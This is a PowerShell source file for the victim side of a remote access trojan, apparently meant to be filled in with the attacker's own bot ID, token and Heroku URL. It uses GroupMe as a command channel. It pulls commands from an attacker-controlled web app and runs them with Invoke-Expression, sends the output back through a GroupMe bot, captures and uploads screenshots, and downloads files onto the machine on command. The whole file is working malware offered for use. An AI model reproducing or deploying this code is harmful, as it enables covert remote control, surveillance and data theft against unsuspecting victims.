 # rat.ps1
# By: Bryton Herdes
# GroupME RAT - victim rat.ps1

#Function for sending messages from this victim to groupme chat. Messages will go through as the bot for the
#group it's a part of
function sendmsg() {
    # Send Invoke-RestMethod Portion #
    $Url="https://api.groupme.com/v3/bots/post"
    $Body= @{
            text="$cmd"
            bot_id="YOUR BOT ID"
            }
    Invoke-RestMethod -Method POST -Uri $Url -Body $Body
}

#send nudes
function sendpics() {
    $Url = "https://image.groupme.com/pictures"
    $GM_TOKEN = "YOUR GM TOKEN"
    $content = "image/jpeg"
    $dict = @{}
    $dict.Add("X-Access-Token","$GM_TOKEN")

    #Command will store data in 
    $picture=Invoke-RestMethod -Method POST -Uri $Url -Headers $dict -ContentType $content -InFile "C:\Users\Public\screenshot.png" | Out-String
    $picture=$picture.Split(';')[0]
    Remove-Item "C:\Users\Public\screenshot.png"
    #echo $picture
    return $picture
}

# Function for getting the command to run and send 
function getcmd() {
    # Send Invoke-RestMethod Portion #
    $Url="YOUR HERKU APP URL TO POST TO" #example.herokuapp.com/post
    $Body= @{
            "name"="target"
            "text"="yea let's try"
            } | ConvertTo-Json
            
    $cmd=Invoke-RestMethod -Method POST -Uri $Url -Body $Body -ContentType "application/json"
    
    $cmd=$cmd | select text | ft -HideTableHeaders | Out-String
    $cmd=$cmd.Trim()
   
    return $cmd
}


function getNum() {
    $number=Invoke-RestMethod -Method POST -Uri $Url -Body $Body -ContentType "application/json"
    echo $number
    $number=$number | select number | ft -HideTableHeaders | Out-String
    $number=$number.Trim()
    $intNumber=[int]$number
    return $number
}

[Reflection.Assembly]::LoadWithPartialName("System.Drawing")
function screenshot([Drawing.Rectangle]$bounds, $path) {
   $bmp = New-Object Drawing.Bitmap $bounds.width, $bounds.height
   $graphics = [Drawing.Graphics]::FromImage($bmp)
   $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size)
   $bmp.Save($path)
   $graphics.Dispose()
   $bmp.Dispose()
}

$exec_cmd=getcmd | Out-String
#echo $exec_cmd
$all=$exec_cmd.Split(",") | Out-String
echo $all

[string]$i = ""

foreach ($d in $all) { 
###Send cmd output to chat!
    $exec_cmd = $d
    $exec_cmd=$exec_cmd.Trim()
    echo $exec_cmd
    if ($exec_cmd -eq "pic") {
         $bounds = [Drawing.Rectangle]::FromLTRB(0, 0, 1000, 900)
         screenshot $bounds "C:\Users\Public\screenshot.png"
         $cmd=sendpics
       #  echo $cmd 
         sendmsg
         break
    }
    ##work in progress##
    if ($exec_cmd.Contains("upload")) {
        #echo $exec_cmd
        $uri=$exec_cmd.Split(" ")[1]
        $fileOut=$exec_cmd.Split(" ")[2]
        Invoke-WebRequest $uri -outfile $fileOut 
        #echo "made it here"
        break
    }
    $tmp=Invoke-Expression -Command $exec_cmd
    $exec_cmd += $tmp | Out-String
    $count=$exec_cmd.Length
    #echo $count

    [int]$i=0
    [int]$j=999

    #if command string length is less than 1000, we can just send it straightaway
    if($count -lt 1000) {
        $cmd=$exec_cmd
        sendmsg
        continue
    }

    $k=$j

    for($j=999; $j -gt 1; $j+=1000) {
        if($j -ge $count) { #is J greater than the length of our command string
            $cmd=$exec_cmd.Substring($i,$k)
            # Send Invoke-RestMethod Portion #
            sendmsg
            break
        }
        else {
            $cmd=$exec_cmd.Substring($i,$k)
            # Send Invoke-RestMethod Portion #
            sendmsg
            $i=$j
            $k=$count - $j - 2
        if($k -ge 1000) { #limited length of message 1k characters
            $k=999
        }
    }  
}

} 
